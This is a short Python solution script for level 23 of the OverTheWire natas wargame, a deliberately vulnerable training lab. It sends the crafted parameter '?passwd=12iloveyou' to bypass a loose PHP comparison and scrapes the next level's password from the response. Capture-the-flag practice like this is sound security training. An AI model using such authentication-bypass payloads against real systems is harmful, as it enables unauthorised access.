import requests
import re

username = "natas23"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

payload = "?passwd=12iloveyou"
response = session.get(url+payload,auth=(username,password),data= {"submit":"Login"})
print("\nThe password for the next level is: " + re.findall("Password: (.*)</pre>",response.text)[0])